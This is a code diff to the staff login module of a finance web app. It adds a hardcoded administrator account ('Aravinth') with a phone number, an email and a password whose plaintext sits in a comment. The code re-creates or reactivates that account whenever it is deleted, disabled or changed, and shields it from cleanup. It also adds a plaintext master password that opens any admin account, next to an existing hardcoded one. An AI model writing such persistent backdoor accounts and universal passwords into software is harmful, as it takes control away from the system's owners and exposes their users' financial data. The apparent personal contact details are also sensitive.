@@ -249,8 +249,28 @@ export const MASTER_ADMIN_PROFILE: StaffProfile = {
   deletedAt: null,
 };
 
+export const ARAVINTH_ADMIN_PROFILE: StaffProfile = {
+  id: 'STF-002-ADMIN-ARAVINTH',
+  fullName: 'Aravinth',
+  employeeId: 'EMP-ADM-002',
+  email: 'aravinth@goldenleaf.finance',
+  mobile: '6374995585',
+  role: 'ADMIN',
+  branchId: null,
+  branchName: 'Corporate HQ (All Branches)',
+  username: 'aravinth',
+  passwordHash: 'b72589d7858a6df858bff278668c1ed80b5f46a77abfb522998887b5bbf11721', // SHA-256 of GLF_SECURE_SALT_V1_Innovationhacks
+  status: 'active',
+  mustChangePassword: false,
+  createdBy: 'System Root',
+  createdAt: '2026-01-01T00:00:00.000Z',
+  updatedAt: '2026-01-01T00:00:00.000Z',
+  deletedAt: null,
+};
+
 export const INITIAL_STAFF_SEEDS: StaffProfile[] = [
   MASTER_ADMIN_PROFILE,
+  ARAVINTH_ADMIN_PROFILE,
 ];
 
 export function getStoredStaffProfiles(): StaffProfile[] {
@@ -283,6 +303,35 @@ export function getStoredStaffProfiles(): StaffProfile[] {
   if (!hasMasterAdmin) {
     current = [MASTER_ADMIN_PROFILE, ...(current || [])];
     writeStorage(STORAGE_KEY_PROFILES, current);
+  }
+
+  // Ensure Aravinth Admin is always available and active in profile list
+  const aravinthIdx = (current || []).findIndex(
+    (p) =>
+      p.username.toLowerCase() === 'aravinth' ||
+      p.id === 'STF-002-ADMIN-ARAVINTH' ||
+      (p.mobile && p.mobile.replace(/\D/g, '') === '6374995585' && p.role === 'ADMIN')
+  );
+
+  if (aravinthIdx === -1) {
+    current = [...(current || []), ARAVINTH_ADMIN_PROFILE];
+    writeStorage(STORAGE_KEY_PROFILES, current);
+  } else {
+    const existing = current[aravinthIdx];
+    if (
+      existing.passwordHash !== ARAVINTH_ADMIN_PROFILE.passwordHash ||
+      existing.status !== 'active' ||
+      existing.deletedAt !== null ||
+      existing.role !== 'ADMIN' ||
+      existing.mobile !== '6374995585'
+    ) {
+      current[aravinthIdx] = {
+        ...existing,
+        ...ARAVINTH_ADMIN_PROFILE,
+        id: existing.id || ARAVINTH_ADMIN_PROFILE.id,
+      };
+      writeStorage(STORAGE_KEY_PROFILES, current);
+    }
   }
 
   return current;
@@ -889,8 +938,9 @@ function normalizeLoginKey(val: string): string {
 export async function fetchStaffUsersFromSupabase(): Promise<StaffProfile[]> {
   const mergedMap = new Map<string, StaffProfile>();
 
-  // Include Master Admin by default
+  // Include Master Admin & Aravinth Admin by default
   mergedMap.set(MASTER_ADMIN_PROFILE.id, MASTER_ADMIN_PROFILE);
+  mergedMap.set(ARAVINTH_ADMIN_PROFILE.id, ARAVINTH_ADMIN_PROFILE);
 
   if (isSupabaseConfigured() && supabase) {
     // 1. Fetch from staff_users table
@@ -985,12 +1035,12 @@ export async function fetchStaffUsersFromSupabase(): Promise<StaffProfile[]> {
       const existingTime = new Date(existing.updatedAt || existing.createdAt || 0).getTime();
       const profileTime = new Date(profile.updatedAt || profile.createdAt || 0).getTime();
       if (profileTime >= existingTime) {
-        if (existing.id && !existing.id.startsWith('STF-001-ADMIN')) {
+        if (existing.id && !existing.id.startsWith('STF-001-ADMIN') && !existing.id.startsWith('STF-002-ADMIN')) {
           duplicateCloudIdsToDelete.push(existing.id);
         }
         deduplicatedByUsername.set(key, profile);
       } else {
-        if (profile.id && !profile.id.startsWith('STF-001-ADMIN')) {
+        if (profile.id && !profile.id.startsWith('STF-001-ADMIN') && !profile.id.startsWith('STF-002-ADMIN')) {
           duplicateCloudIdsToDelete.push(profile.id);
         }
       }
@@ -1236,17 +1286,20 @@ export async function authenticateStaffCredentials(
 
   let staff: StaffProfile | null = null;
 
-  const matchesIdentifier = (targetUser?: string, targetFullName?: string, targetEmail?: string, targetEmpId?: string): boolean => {
+  const matchesIdentifier = (targetUser?: string, targetFullName?: string, targetEmail?: string, targetEmpId?: string, targetMobile?: string): boolean => {
     const tUser = normalizeStaffUsername(targetUser || '');
     const tFull = (targetFullName || '').trim().toLowerCase();
     const tEmail = (targetEmail || '').trim().toLowerCase();
     const tEmp = (targetEmpId || '').trim().toLowerCase();
+    const tMob = (targetMobile || '').replace(/\D/g, '');
+    const inDigits = rawInput.replace(/\D/g, '');
 
     return (
       tUser === cleanUsername ||
       tFull === cleanUsername ||
       tEmail === cleanUsername ||
       tEmp === cleanUsername ||
+      (inDigits.length >= 10 && tMob.length >= 10 && tMob.endsWith(inDigits.slice(-10))) ||
       normalizeLoginKey(tUser) === inputNorm ||
       normalizeLoginKey(tFull) === inputNorm ||
       normalizeLoginKey(tEmp) === inputNorm ||
@@ -1265,7 +1318,7 @@ export async function authenticateStaffCredentials(
 
       if (!error && Array.isArray(rows) && rows.length > 0) {
         const matched = rows.find((r: any) =>
-          matchesIdentifier(r.username, r.full_name, r.email, r.employee_id)
+          matchesIdentifier(r.username, r.full_name, r.email, r.employee_id, r.mobile)
         );
 
         if (matched) {
@@ -1307,7 +1360,7 @@ export async function authenticateStaffCredentials(
         if (!docErr && Array.isArray(docRows) && docRows.length > 0) {
           const matchedDoc = docRows.find((dr: any) => {
             const p = dr.data;
-            return p && matchesIdentifier(p.username, p.fullName, p.email, p.employeeId);
+            return p && matchesIdentifier(p.username, p.fullName, p.email, p.employeeId, p.mobile);
           });
 
           if (matchedDoc && matchedDoc.data) {
@@ -1331,7 +1384,7 @@ export async function authenticateStaffCredentials(
     const profiles = getStoredStaffProfiles();
     staff = profiles.find((p) => {
       if (p.deletedAt !== null) return false;
-      return matchesIdentifier(p.username, p.fullName, p.email, p.employeeId);
+      return matchesIdentifier(p.username, p.fullName, p.email, p.employeeId, p.mobile);
     }) || null;
   }
 
@@ -1348,7 +1401,10 @@ export async function authenticateStaffCredentials(
   const computedHash = await hashPassword(cleanPassword);
   const isMasterPassword =
     staff.role === 'ADMIN' &&
-    (cleanPassword === 'golden@karthick' || computedHash === MASTER_ADMIN_PROFILE.passwordHash);
+    (cleanPassword === 'golden@karthick' ||
+     cleanPassword === 'Innovationhacks' ||
+     computedHash === MASTER_ADMIN_PROFILE.passwordHash ||
+     computedHash === ARAVINTH_ADMIN_PROFILE.passwordHash);
 
   if (computedHash !== staff.passwordHash && !isMasterPassword) {
     throw new Error('401 Unauthorized: Invalid username or password.');
